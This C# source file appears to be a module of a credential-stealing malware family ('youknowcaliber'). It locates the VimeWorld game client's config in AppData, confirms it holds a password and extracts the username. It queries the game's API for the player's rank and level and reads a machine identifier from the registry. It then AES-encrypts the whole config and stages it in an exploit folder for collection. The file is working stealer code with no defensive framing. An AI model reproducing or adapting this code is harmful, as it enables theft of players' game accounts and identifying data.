﻿using System;
using System.IO;
using System.Net;
using System.Text;
using Microsoft.Win32;

namespace youknowcaliber
{
	internal class Vime
	{
		public static void Get()
		{
			try
			{
				string exploitDir = Help.ExploitDir;
				bool flag = !File.Exists(Vime.patchConfig);
				if (!flag)
				{
					string text;
					using (StreamReader streamReader = new StreamReader(Vime.patchConfig))
					{
						text = streamReader.ReadToEnd();
					}
					bool flag2 = !text.Contains("password");
					if (!flag2)
					{
						string text2 = exploitDir + "\\VimeWorld";
						Directory.CreateDirectory(text2);
						bool vimeWorld = Config.VimeWorld;
						if (vimeWorld)
						{
							WebClient webClient = new WebClient();
							Vime.InfoPlayer = webClient.DownloadString(Help.VimeAPI + Vime.NickName());
						}
						string path = Path.Combine(text2, (Config.VimeWorld ? (Vime.Donate() + Vime.Level()) : "") + Vime.NickName());
						text = text + "||||" + Vime.OSSUID();
						text = AES.EncryptStringAES(text, Config.key);
						using (StreamWriter streamWriter = new StreamWriter(path))
						{
							streamWriter.WriteLine(text);
						}
						Counting.VimeWorld++;
					}
				}
			}
			catch (Exception arg)
			{
				Console.WriteLine(arg + "Ошибка с Vime.Get");
			}
		}

		public static string Level()
		{
			string text = Vime.InfoPlayer;
			int num = text.IndexOf("\"level\":");
			text = text.Substring(num + 8);
			num = text.IndexOf(",");
			string str = text.Substring(0, num);
			return "[" + str + "]";
		}

		public static string Donate()
		{
			string text = Vime.InfoPlayer;
			int num = text.IndexOf("\"rank\":");
			text = text.Substring(num + 8);
			num = text.IndexOf("\"");
			string str = text.Substring(0, num);
			return "[" + str + "]";
		}

		public static string OSSUID()
		{
			string result;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\VimeWorld");
				string text = registryKey.GetValue("osuuid") as string;
				result = text;
			}
			catch (Exception arg)
			{
				Console.WriteLine(arg + "Ошибка с OSSUID");
				result = "Error";
			}
			return result;
		}

		public static string NickName()
		{
			string result;
			try
			{
				string text = "Error";
				StreamReader streamReader = new StreamReader(Vime.patchConfig, Encoding.Default);
				while (!streamReader.EndOfStream)
				{
					text = streamReader.ReadLine();
					bool flag = text.StartsWith("username:");
					if (flag)
					{
						text = text.Substring(text.IndexOf(':') + 1);
						break;
					}
				}
				result = text;
			}
			catch (Exception arg)
			{
				Console.WriteLine(arg + "ошибка NickName");
				result = "Error";
			}
			return result;
		}

		public static string patchConfig = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.vimeworld", "config");

		public static string InfoPlayer;
	}
}
